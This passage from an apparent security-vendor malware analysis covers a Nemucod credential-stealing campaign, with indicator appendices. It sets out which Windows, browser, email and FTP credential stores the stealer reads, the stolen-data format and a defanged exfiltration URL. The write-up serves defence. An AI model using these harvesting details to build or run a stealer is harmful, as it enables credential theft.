functions that enumerate and retrieve any stored credentials, as shown in Figure 26 below.\n\n\n\nFigure 26: Payload code to gain access to legacy Windows Pstore.\n\nCredential Cache\n\nThe malware then checks the credential cache, which is used in later versions of Windows, and allows all built-in applications in Windows Internet Explorer to store and use credentials automatically. Credentials using HTTP\u2019s basic authentication passwords can be stored here as well as network login passwords. The malware searches specifically for the latter by filtering for passwords starting \u201cMicrosoft_WinInet_*\u201d to attain only credentials stored by Internet Explorer, as shown in Figure 27 below:\n\n\n\nFigure 27: Payload code accessing Internet Explorer stored credentials\n\nThe 128-bit value Globally Unique Identifier (GUID) \u2018abe2869f-9b47-4cd9-a358-c22904dba7f7\u2019 shown in Figure 27 is used in conjunction with the built-in Windows Cryptography functions to encrypt and, in the malware\u2019s case, decrypt the stored credentials attained.\n\nWindows Vault\n\nBefore moving on to harvesting data from browsers and other applications the actors check one final credential store \u2013 Microsoft\u2019s \u2018Windows Vault\u2019, which is part of built-in Credential Manager. Providing the victim\u2019s Operation System is 6.2 (Windows 8 or Windows Server 2012) the malware loads the Vault Client Access Library (vaultcli.dll) and uses it to access stored credentials.\n\nBrowsers\n\nThe actors then shift their attention to web-browsers including Firefox, Chrome and Opera (Internet Explorer has been covered by the previous steps already). The malware enumerates various Windows Registry keys gathering installation folder paths for these browsers before attempting to harvests credentials stored by them.\n\nUsing Chrome as an example, the malware locates the sqlite database files created and used by the browser to store various pieces of information. One of the sqlite files the actors target is named \u201cWeb Data\u201d and includes autofill information for auto-populating HTML forms for logins, postal addresses and so on. The sqlite command \u2018.tables\u2019 lists the table names as shown below:\nsqlite&gt; .tables\nautofill                 credit_cards             server_addresses       \nautofill_profile_emails  ie7_logins               server_card_metadata   \nautofill_profile_names   keywords                 token_service          \nautofill_profile_phones  masked_credit_cards      unmasked_credit_cards  \nautofill_profiles        meta                   \nautofill_profiles_trash  server_address_metadata\n\nLooking at the data held in my test system\u2019s \u2018autofill\u2019 table, in the \u2018Web Data\u2019 database, you can see details related to a previous HTML form completion using a fictitious first and last name and cell phone number.\nsqlite&gt; select * from autofill;\nFirstName|Bob|bob|n|n|1\nLastName|REDACTED|REDACTED|n|n|1\ndeviceAddress|REDACTED|REDACTED|n|n|1\n\nAnother database accessed by the malware is named \u2018Login Data\u2019 that includes a table \u2018logins\u2019 containing information such as the example below showing a login to Google\u2019s accounts service to access mail, calendars and more.\n\nEmail Clients\n\nThe next focus is on harvest credentials from email clients installed on the victim\u2019s system, starting with Outlook and Outlook Express. The malware checks the registry key \u2018HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Account Manager\\Accounts\u2019 for data relating to such installed clients or Windows address books, and enumerates all of the \u2018Server\u2019, \u2018User\u2019 and \u2018Password\u2019 values for SMTP, POP3 and IMAP protocol types, as shown in the Figure 28 below, and gathers the respective data.\n\n\n\nFigure 28: Windows registry storing some email client account credentials\n\nThe malware continues to check for other installed mail clients, including Mozilla\u2019s Thunderbird, RITLabs\u2019 TheBat!, Windows Mail and Windows Live Mail, to harvest yet more credentials.\n\nThe mail client TheBat! written by software company RITLabs happens to be based in Chisinau in the Republic of Moldova. This is interesting as some of the infrastructure used by the threat actors, which I discuss in more detail later, is located in or registered to places in the same country.\n\nFinally, the malware checks for various software applications that communicate over SSH (Secure Shell), FTP (File Transfer Protocol) and HTTP protocols often used to remotely connect and administer systems or to transfer files between systems. The goal here is to harvest any stored credentials as well as system hostnames and IP addresses. Credentials stored in these types of applications would be very useful for attackers who wish to move through the compromised network for further reconnaissance or performing other attack objectives.\n\nThe applications in question include WinSCP (Windows Secure Copy) used for copying files over SSH and Total Commander (Ghilser), FileZilla, FlashFXP, Cyberduck, CoffeeCup Software, CuteFTP and SmartFTP all of which include FTP capabilities.\n\nExfiltration\n\nAny credentials found by the malware will be stored in a text file in the victim\u2019s temporary folder in preparation for exfiltration. In this version\u2019s case the file was named as follows:\n\n%TEMP%\\goga.txt\n\nThe format of this text file is as shown below and contains the unique identifier (uid) that was used earlier during the registration process, together with the date and time, allowing for the actors to sift their data accordingly, before the list of any credentials harvested during execution describing the protocols and ports required, usernames, passwords and hostnames.\nTEST-UID\nYYYY-MM-DD HH:MM:SS\nftp:\/\/username:password@ftp.somedomain.com:21\nhttps:\/\/username:password@accounts.somedomain.com\/\nThe final phase for this malware is to offload all the information harvested to the actors by communicating using a HTTP POST request under the pretence of a Windows 7 Operating System and FireFox browser by setting the HTTP HEADER\u2019s User-A\u00adgent field to the following string:\nMozilla\/5.0 (Windows NT 6.1; rv:45.0)\nThe malware makes calls to the InternetOpenA, InternetConnectA and HttpOpenRequest functions from the Wininet.dll library to prepare the HTTP POST request to the following URL where the contents of goga.txt will be sent.\n\nhttp:\/\/185.159.82[.]11\/re\/b.php\n\nInfrastructure:\n\nWHOIS reports the following for the IP address used in this version of the malware to both register the victim system infection and to exfiltrate the stolen credentials:\n\n \tThe IP belongs to a Russian-owned hosting service, King Servers\n \tThe IP resolves to domain customer.clientshostname.com\n\nInvestigating IP and hostname information for all the samples gathered in this research shows a much wider infrastructure, described in more detail below, however, remaining focussed on the single IP discussed throughout this blog and, as shown in Figure 29 below, there are malware samples (the red circles) including weaponized documents (red circles) and PE file samples (red circles with blue bookmark) as well as domain names (blue circles) associated with the domain name resolved from said IP \u2013 customer.clientshostname.co.uk.\n\nThe vast majority of the samples in figure 29 were first seen in AutoFocus between January and March in 2017 except for two that were seen in late December 2016. The IP address resolved to the hostname customer.clientshostname[.]com depicted by the orange circle in the center of the figure; the blue circles attached represent sub-domains of clientshostname[.]com that mostly appear to use a \u2018firstlast\u2019 name convention, such as \u2018joebloggs\u2019. Some of these sub-domains have been linked, through reverse DNS, to IP address Indicators of Compromise (IOCs) listed in the Grizzly Steppe report. From the samples analysed it is not clear how these subdomains are being used.\n\n\n\nFigure 29: Partial infrastructure\n\nThe following figure highlights another two IP addresses (185.130.104[.]156 and 185.130.104[.]178) that reside in the same class C network range together and within the same class B network range as the IP from the previous figure. All versions in this figure are weaponized documents except for one that is a PE executable credential stealer (depicted again by a red circle blue bookmark) and most reference IP 185.130.104[.]156 at the base and center of the semi-circle in the figure, and in the zoomed-in box. All but one of these samples were seen in AutoFocus in November 2016 with the outlier (arrow #1) seen in late December.\n\nInterestingly, this IP address also had some associated domain names, as shown in the zoomed-in box as well, including letstrade-bit[.]com, lesbtc[.]com (and mail.lesbtc[.]com) and secure-trade24[.]com with the former two domains being registered December 20th and the latter on December 14th. All three domains mention trading or Bitcoins (BTC) but from the samples analysed, it is not clear how these subdomains are being used, however such terms are indicative of contemporary ransomware that requests ransom payments using BTC.\n\nIP 185.130.104[.]178 (arrow #2) has three associated weaponized document versions all of which were seen in AutoFocus in the last week of February, which together with aforementioned IP addresses, indicates how different waves of this campaign occur over different months and how the actors switch to using different IP addresses within the infrastructure for their C2 communication.\n\n\n\nFigure 30: Partial infrastructure\n\nFollowing along that theme of the actors\u2019 versions using different C2 communication hosts, the following figure shows yet more groups of versions using other IP addresses for their C2. The two IPs below once again share the same class C network range as each other with one IP (217.28.218[.]231) being used for only one version (arrow #1), which happens to be the first seen in AutoFocus on October 26th (the one with the Breaking Bad references) while the other IP (217.28.218[.]210) hosts twelve known versions\u2019 C2 communications, three of which are PE executable credential stealers; the remainder are weaponized documents.\n\n\n\nFigure 31: Partial infrastructure, including first version from October 26th.\n\nTwo weaponized document versions, shown in Figure 32 below were seen on the 19th and 30th of December in AutoFocus. These versions were a little different from the majority that were emailed to their victims as these were downloaded over the web-browsing application (HTTP) from the website argos-tracking.co[.]uk. The victim organisations belonged to the Telecommunications and Healthcare sectors in the United Kingdom.\n\n\n\nFigure 32: Partial infrastructure showing argos-tracking domain name.\n\nThe .co.uk Second Level Domain (SLD) is intended for UK-based businesses and, when combined with the words argos and tracking, would resonate with many UK citizens as possibly being related to the UK-based retailer business Argos, which has an online retail presence including a parcel tracking service. Given this information, and the UK targets seen using AutoFocus, it\u2019s clear the threat actors were trying to deceive and socially engineer UK victims.\n\nAccording to the WHOIS records the argos-tracking.co[.]uk domain registrant, a Mr Milosh Zotich from Belgrade, Serbia registered this now-suspended domain on the 15th December 2016 \u2013 just 4 days before AutoFocus saw use of the domain \u2013 and provided the domain names parking-1.domains4bitcoins[.]com and parking-2.domains4bitcoins[.]com as nameservers. Domains4bitcoins needs little introduction but just in case you weren\u2019t aware, such services are used for domain registration and hosting services in an anonymous fashion through the use of a digital crypto currency. These nameservers were updated on December 20th to various nameservers at ClouDNS, a site offering free DNS hosting and domain names.\n\nThe most recent change to the argos-tracking.co[.]uk domain was on the 22nd February 2017 to suspend it. This example highlights the lengths the actors will go to in their reconnaissance of their victims in order to increase their changes of successful compromise.\n\nConclusions\n\nNemucod malware is mostly deployed using weaponized documents where the malicious VBA macro code is responsible for constructing and executing a malicious encoded JScript file that carries out further activities including registering victims with the actors before downloading payloads, which in this case included a credential stealing Trojan executable component.\n\nThough the encoded JScript content was dropped by executable files attached to emails in malspam campaigns it was a much less common technique compared to weaponized documents dropping the content, most likely due to a reduced infection success rate because of the additional suspiciousness executable files on email pose.\n\nThis particular Nemucod campaign was seen by Unit 42 and AutoFocus running from late October through to late March 2017 impacting various countries, especially within Europe, and across various industries.\n\nGiven the details discussed in this blog, such as the argos-tracking.co[.]uk domain registration information; the location of the IP addresses and that many belong to a Russian-owned hosting service, King Servers; and the weaponized document code page and language settings it\u2019s highly likely this malware, the attack campaigns and the threat actors originate from Eastern European countries.\n\nMuch like the evolutionary changes to the delivery documents, obfuscation techniques and social engineering methods used in this campaign, other malspam campaigns recently have highlighted the pace of development and changes within a single campaign to collect more victims or remain undetected for longer, as described in another Unit 42 blog.\n\nPalo Alto Networks customers are protected by these threats in the following ways:\n\n \tAll samples discussed are classified as malicious by the WildFire sandbox platform.\n \tAll identified domains have been classified as malicious.\n \tAutoFocus users can track the malware described in this report using the Nemucod tags.\n \tCustomers running Traps are protected by preventing Nemucod from executing.\n\nWhen executing any of the weaponized documents on a Traps-protected end-point one of the default restrictions will be triggered protecting the system due to the suspicious execution of a child processes. In this case Winword.exe (Word\u2019s process) tries to execute wscript.exe (Windows Scripting Host\u2019s process). Given these weaponized documents often arrive through email a more real-world scenario would include a larger process tree of Outlook (or equivalent email application) executing Word in turn executing the Windows Scripting Host. Figure 33 below shows a typical Traps Prevention Alert for such activity.\n\n\n\nFigure 33: Traps Advanced End-point preventing the malware infection via child process restrictions.\n\nFigure 34 below shows in more detail, through the Enterprise Service Manager (ESM) the host affected, the restriction that triggered (1), the host system and the processes involved (2) as well as their hashes, versions, digital signatures, if any, and any related files or URLs. In this case the JSE file that was attempting to run in the context of the Windows Scripting Host process is listed (3).\n\n\n\nFigure 34: Traps Enterprise Service Manager (ESM) detailing the restriction and blocked malware.\nAppendix A: Indicators of Compromise\nEmail Attachment Names:\n\nMicrosoft Office Word Document.doc\n\nDetails.doc\n\nList.doc\n\nDoc1.doc\n\nAgr.doc\n\nYoursDoc.doc\n\nDocs.doc\n\nYourGoods.doc\n\nR.doc\n\nr_vk.doc\n\nVertragskopie\n\ngoods.doc\n\nAgreement_copies.doc\n\ndocuments.doc\n\nVertrag.doc\n\nfile\n\nBishop-GmbH-Vertrag.doc\n\nRechn.doc\n\nRec.doc\n\nEmail Subjects:\n\nYour Eguipment\n\nAW:Your order was completed\n\nAW:Delivery\n\nRe:Delivery\n\nDocuments\n\nAW:Goods\n\nDelivery\n\nGoods\n\nPackage\n\nRe:Documents\n\nAW:Package\n\nRe:Order\n\nRe:Waiting for payment\n\nAW:Waiting for payment\n\nRe:agreement\n\nRe:Your order was completed\n\nAW:Order\n\nAW:Documents\n\nRe:Package\n\nRe:Goods\n\nAW:agreement\n\nGet Carried Away at The Peninsula\n\nDiscover The Revolutionary Trick To Restore Your Memory!\n\nRE: Rechnung\n\nAW:Rechnungen\n\nRE:Rechnungen\n\nAWd: Rechnung\n\nRE: billing terms\n\nRE: We are waiting for your payment.\n\nRE: payment\n\nAWd:Rechnungen\n\nAW:Auftrag\n\nAW:Dokumentation\n\nAW:Technikdokumentation\n\nRE:Begleichung\n\nAW:Schlussbestimmungen\n\nre:bishop-gmbh-vertrag\n\nAW: Rechnung\n\nPE Dropper Hashes\n\n1b64d1c93e53fa74d89c3362c30899644e9fef7f11292f40740b216bcbe03285\n\n1db89009b678ba4517fc7490b9a7f597b838939499365374eba32347393fdd4e\n\n85d56628f7ec277a5f49a801ef4793072edd56d9c26b0bdb9b3dc348366c734a\n\nb75b3ff65632b65d1d641075bd2f5ed0ede93da3a35d7f50068b9371ee5c4552\n\nffc5e46200f16549f17d2d6e4d6e5e61239b711cd07fbf7932c31e2ea18a7865\n\nDocument Dropper Hashes\n\n0a59bc35fe7bd84c955402aba2ad3883a5cdb08deb353c8f6310a163109f0c60\n\nfee6b19ff8a39e83756345af421d3d85d20e67df62ac58bc05f514c368efc329\n\n8e9af7d90193bddc89d1c3782477bde76f90707eb1900537c020fc02970bbd74\n\nc173085b954ff1055fb859e6584a9e0bb3919740752351ad50706c0b7be37b51\n\n1faa27f82bcbad0acc444727e7be35147e5a2ee92757781e5f26db614d3cee7f\n\n6ebd2955fb137b5c983bbfb7601ea49ceb1f66119d13ce850c12d89e8c6a3742\n\n777560483cb903ba803bfdbbd1f37353706da3a265e32da44fffb3ec7fcf07a2\n\n7df6bd0af983f87dc34a71d009a3bd3bd272e094c6c55bf765148d836129e10c\n\nd58cfd2d851b9c98f9de79d38944d72eddec1e2243f1065de7d8b1ed1bf1cddd\n\n4916bc8dc91941a444d3aa41616eaebe8c3d4b095a0c566945b85c143ae532c1\n\nde5ac4aedaca5649758bf34c87fd59967c2adeaaa0be65a58b9c8e9f6a8660f1\n\n368304125ffd86a234aeb8c05a90b7ee40b37dae1dea7178deeda522eac9dcbc\n\n1384934c09f6551d19150bfcf8ae954f4969d0b9ff841c93f81ebb57eecc9a71\n\nf89edff923d1d2daf6b2ab36595e873ed7d1cd52c2f6b66b590fa636c17dced2\n\nb1d5bfb124a15ab9068cf413de430a1c2cbd7b2bf67a766cf971269c67c3eace\n\n256078f83cf9535c72debffa3d34818789849131e9138589728b4085e2ae2169\n\nd3683a4fe910d5815541beb2c42b98827a1f6362073b9901a74c36e15072c1a2\n\ncfe56d178ff873a5d984220c96570144a6674ce1b675036566a93ff6d680a981\n\n069a4abb186efb6c3b6733cb2f35151d03eefe40cfb626d3c42aaa5f7ef342c6\n\n97ea044a5820f9271c21bd8f1bb381099fb188a7d9f54ac72a88bf41411cf1b3\n\n5b331693bc7ad009db3905fd37edfa94c528b6c4eee024f7a35dcc9b6b8a9c26\n\n7e62823f8a775674b6333ff535e93a9fc0bdcfd943c903fe85e614b34d692549\n\na85b040e923e45a3e139576c2086a8f1671b1c60053274d850218ffa422f80e6\n\n1c95a2a32b639008245a205f51aa7fbafc0b61ecc6879f9978be174feee516f4\n\n9e9e7ade1def82a56898415c079bd3f861c143f9db6770a28592bbbe04d5f234\n\n40fd876c5d7f859484a8d3a021ce3c5eeba23deb8574f4b598aeaa6a0ded7815\n\n92c82d7ea7b89f02c5b8e7d93d2a4ad17fbc0688ff9ad881cc185c18ea466232\n\nae3bb85b87d40a12e82b2545fd4c9087b3e847a744a27c1ac215dd38821ced87\n\nc600c7638474fb31664ab32fb9aad5c216096b2c68d93c9eb37cf0476868cf05\n\n8451cf3f5e5e2576f2ad36a4f19998e5824c2ab185f40ddec460a81ab1a8525a\n\n34e5104bea2728cf9107b4ede124daee8ac68ad0979c66c356ddf3a0e6d0f4c6\n\n7b48b21b10990cd53bb8969930b9f0b39cc495e95a33c38f80024a21a72b0176\n\ndcf3c00a20af527869771a7834565fb938739e3abf84038e2376b23a14926a38\n\nd8e62ce3039921c11872319a09acc61038f2452a6a2fdb8c0d3a0848b56b26ff\n\n50ab7834e98c2f40d7441006a0221c07bff5f9f694999b595daa29b37c9a5e12\n\nb4d3c369449ead7ced48f84b9ea29cb4dbc6f485958e813b102c1d32ce62d3e8\n\na02ed37812ac37d44979d5131aa10927fb9b9bd09aae2b470e65532bc694b27c\n\n61bcd9b0c11989d6049fd181786f1748116c128bd4768d1b6849805186190320\n\n6edbbc7f02179211c5b8da74a770492e25b31be683468629a073f313f25ec8b6\n\n985d44dfeaf83c2c39c331e4b07b19e8726fb0ec168223455476132fe8c32fc8\n\n1a60afa5c3dcff0fc41179e6a3b71ea0a92e4b50192eaa4c8e2b16ea0c50a229\n\n76edebe74e015e709abb662c4fa8a2db2f24c12d5b6c51822eef403bf3c3a304\n\n3fdcaf24d5c45d7a8dcf1b2932c026915a982de19b52a8f346ca312c58d36f05\n\n561343438f0c26fa7628a91584628a5bd62c3abe1c0cf890b9fdb0528adbde62\n\n7f53abc951258d5663119f3ac383b8f84da5acbf0bb9063e5e113ca87b1843ae\n\n7c552166089ebf45081a5d14bef331e3153a5de50c53b66211b044a08f46153c\n\n432a220ca1e6c64546f21807e17521c243cce2a63d956d0c0cf21a1101835829\n\n297665276699830549c83ae79cd2c48e23733e9569be8040ee38d08a4d99192e\n\n5e54c865afbd42f5a7b4007840e3099d8e1882c58542d08263ffc23fe994ef9b\n\n8aa5a12bb237f93fc0c3f150a41fcc60e86007b1000c2b133457b2be27dfad4e\n\n8e7f77a61a1e710e368257a37fe6785f9b608bb068e5c40824623d299997dbf0\n\n379615acf199bb0beaee736824067b83dcbb2ae60eb648576c81d4971330dd16\n\nad94f396f739d4df07f188b9babee829d07da01c986f4795a098d66137c7149c\n\nff7fa949a99d745143d41eeb6b450dca3d95a38031e304b1e829c5bda2ce5213\n\n034421d601d43883528d68741c87e765d76ff4123161d364f6eddfae1f3c7493\n\ne86c5f4fbcd626e1ec4c211ae1ed0d541fc453e6753e84a724f534c0b9700029\n\n8b96d5316accd7d2ee0af01a4ae2766b7173d7705b3eef14d9dcb10cd34238ed\n\nPE Password Stealer Hashes\n\n53edea186162d84803f8ff72fb83c85f427b3813c32bd9d9d899e74ae283368e\n\n76b703c9430abf4e0ba09e6d4e4d6cf94a251bb0e7f3fadbd169fcef954a8b39\n\n99c50b658c632214f0b133f8742a5e6d2d34e47497d7a08ed2d80e4299be3502\n\n&nbsp;\n\n\n\n\n\nRegister for Ignite \u201917 Security Conference \nVancouver, BC June 12\u201315, 2017\nIgnite \u201917 Security Conference is a live, four-day conference designed for today\u2019s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the Ignite website for more information on tracks, workshops and marquee sessions.","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Alex Hinchliffe"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"29312","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=29312' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-29312 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
